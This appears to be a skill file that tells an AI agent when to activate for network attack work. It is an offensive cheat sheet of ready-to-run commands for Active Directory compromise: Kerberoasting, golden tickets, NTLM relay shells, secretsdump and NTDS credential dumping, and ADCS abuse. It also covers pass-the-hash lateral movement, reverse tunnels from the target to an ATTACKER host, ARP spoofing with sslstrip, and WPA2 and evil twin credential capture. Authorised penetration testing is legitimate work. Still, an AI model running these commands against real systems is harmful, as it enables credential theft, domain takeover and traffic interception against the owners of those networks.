---
name: network-attack
description: Network penetration testing — lateral movement, pivoting, protocol attacks, traffic interception, Active Directory exploitation, wireless attacks
metadata:
  type: offensive
  phase: exploitation
  tools: nmap, responder, impacket, crackmapexec, bloodhound, mitm6, bettercap, chisel, ligolo-ng, kerbrute
---

# Network Attack & Lateral Movement

## When to Activate

- Internal network penetration testing
- Active Directory domain compromise
- Lateral movement after initial access
- Network protocol exploitation
- Wireless security assessment
- Traffic interception and manipulation

## Active Directory Attacks

### Enumeration
```bash
# BloodHound collection
bloodhound-python -d $DOMAIN -u $USER -p $PASS -c all -ns $DC_IP
# or SharpHound
.\SharpHound.exe -c all --zipfilename output.zip

# LDAP enumeration
ldapsearch -x -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASS" -b "DC=domain,DC=com" "(objectClass=user)" sAMAccountName memberOf

# Kerbrute user enumeration (no auth needed)
kerbrute userenum --dc $DC_IP -d $DOMAIN users.txt

# CrackMapExec
crackmapexec smb $SUBNET/24 -u $USER -p $PASS --shares
crackmapexec smb $DC_IP -u $USER -p $PASS --users
crackmapexec smb $DC_IP -u $USER -p $PASS -M spider_plus
```

### Kerberos Attacks
```bash
# AS-REP Roasting (no pre-auth required)
impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $DC_IP -format hashcat
hashcat -m 18200 asrep_hashes.txt wordlist.txt

# Kerberoasting (any domain user)
impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $DC_IP -request
hashcat -m 13100 tgs_hashes.txt wordlist.txt

# Silver Ticket (service account NTLM hash)
impacket-ticketer -nthash $NTLM -domain-sid $SID -domain $DOMAIN -spn $SPN $USER

# Golden Ticket (krbtgt hash = domain compromise)
impacket-ticketer -nthash $KRBTGT_HASH -domain-sid $SID -domain $DOMAIN Administrator

# Delegation abuse
# Unconstrained: compromise server → extract TGTs from memory
# Constrained: S4U2Self + S4U2Proxy to impersonate any user
# RBCD: write msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-getST -spn $SPN -impersonate Administrator $DOMAIN/$MACHINE\$:$PASS
```

### Credential Harvesting
```bash
# Responder (LLMNR/NBT-NS/mDNS poisoning)
responder -I eth0 -wrf

# NTLM relay
impacket-ntlmrelayx -tf targets.txt -smb2support -i  # interactive shell
impacket-ntlmrelayx -tf targets.txt --delegate-access  # RBCD attack

# mitm6 (IPv6 DNS takeover)
mitm6 -d $DOMAIN
# Combined with ntlmrelayx for delegation

# Credential dumping (post-compromise)
impacket-secretsdump $DOMAIN/$USER:$PASS@$TARGET
crackmapexec smb $TARGET -u $USER -p $PASS --lsa
crackmapexec smb $TARGET -u $USER -p $PASS --ntds  # DC only
```

### Privilege Escalation Paths
```
# ACL abuse (BloodHound paths)
# GenericAll → reset password, add to group, write SPN
# GenericWrite → targeted kerberoasting, shadow credentials
# WriteDACL → grant yourself GenericAll
# WriteOwner → take ownership, then WriteDACL

# ADCS (Active Directory Certificate Services)
certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC_IP -vulnerable
certipy req -u $USER@$DOMAIN -p $PASS -ca $CA -template $TEMPLATE -upn administrator@$DOMAIN
certipy auth -pfx administrator.pfx -dc-ip $DC_IP
```

## Lateral Movement

### Techniques
```bash
# PSExec (admin + SMB access)
impacket-psexec $DOMAIN/$USER:$PASS@$TARGET
impacket-psexec $DOMAIN/$USER@$TARGET -hashes :$NTLM

# WMI execution
impacket-wmiexec $DOMAIN/$USER:$PASS@$TARGET

# Evil-WinRM (WinRM/5985)
evil-winrm -i $TARGET -u $USER -p $PASS

# DCOM execution
impacket-dcomexec $DOMAIN/$USER:$PASS@$TARGET

# Pass-the-Hash
crackmapexec smb $TARGET -u $USER -H $NTLM -x "whoami"

# Overpass-the-Hash (get Kerberos ticket from NTLM)
impacket-getTGT $DOMAIN/$USER -hashes :$NTLM
export KRB5CCNAME=user.ccache
impacket-psexec $DOMAIN/$USER@$TARGET -k -no-pass
```

## Pivoting & Tunneling

```bash
# Chisel (HTTP tunnel)
# Server (attacker): chisel server --reverse -p 8080
# Client (target): chisel client ATTACKER:8080 R:socks

# Ligolo-ng (modern pivoting)
# Proxy (attacker): ligolo-proxy -selfcert -laddr 0.0.0.0:11601
# Agent (target): ligolo-agent -connect ATTACKER:11601 -retry -ignore-cert

# SSH tunneling
ssh -D 9050 user@pivot  # SOCKS proxy
ssh -L 8080:internal:80 user@pivot  # Local port forward
ssh -R 4444:localhost:4444 user@pivot  # Reverse port forward

# proxychains configuration
# socks5 127.0.0.1 1080
proxychains nmap -sT -Pn $INTERNAL_TARGET
```

## Network Protocol Attacks

### ARP Spoofing / MitM
```bash
# Bettercap
bettercap -iface eth0
> net.probe on
> set arp.spoof.targets $TARGET_IP
> arp.spoof on
> net.sniff on
> set http.proxy.sslstrip true
> http.proxy on
```

### DNS Attacks
```bash
# DNS zone transfer
dig axfr @$NS $DOMAIN

# DNS cache poisoning setup
# Requires: predictable TXID or birthday attack on ports
```

### SMB Attacks
```bash
# Null session enumeration
smbclient -L //$TARGET -N
rpcclient -U "" -N $TARGET -c "enumdomusers"

# SMB signing disabled → relay attacks
crackmapexec smb $SUBNET/24 --gen-relay-list relay_targets.txt
```

## Wireless Attacks

### WPA2 Cracking
```bash
# Capture handshake
airmon-ng start wlan0
airodump-ng wlan0mon --bssid $BSSID -c $CHANNEL -w capture
aireplay-ng -0 5 -a $BSSID wlan0mon  # deauth to force handshake

# Crack
hashcat -m 22000 capture.hc22000 wordlist.txt
# or
aircrack-ng -w wordlist.txt capture-01.cap
```

### Evil Twin
```bash
# hostapd-wpe for WPA Enterprise credential capture
# Create AP with same SSID, stronger signal
# Capture RADIUS credentials (MSCHAPv2 → crack with asleap)
```

### WPA Enterprise (802.1X)
```bash
# EAP downgrade attacks
# PEAP relay
# Certificate impersonation
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
# Captured credentials: asleap -C challenge -R response -W wordlist
```
